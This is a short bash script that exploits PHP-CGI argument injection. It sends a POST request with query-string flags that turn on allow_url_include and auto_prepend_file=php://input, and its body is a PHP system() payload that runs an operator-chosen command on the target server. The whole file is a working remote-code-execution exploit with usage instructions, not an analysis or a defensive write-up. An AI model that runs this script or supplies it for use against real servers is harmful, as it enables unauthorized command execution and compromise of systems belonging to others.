#!/bin/bash

function ctrl_c() {
  echo -e "\n\n[!] Exiting..."
  exit 1
}

trap ctrl_c SIGINT

if [ $# -ne 2 ]; then
    echo -e "\n[!] Usage: $0 <RHOST> \"<COMMAND>\""
    echo -e "\nExample: $0 http://10.128.20.2 \"whoami\"\n"
    exit 1
fi

rhost=$1
command=$2

exploit() {
    payload="<?php system('$command'); die(); ?>"

    echo
    curl -s -X POST "$rhost/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "$payload" --connect-timeout 10
    
    if [ $? -ne 0 ]; then
        echo "[!] Exploit failed!"
    fi
}

exploit
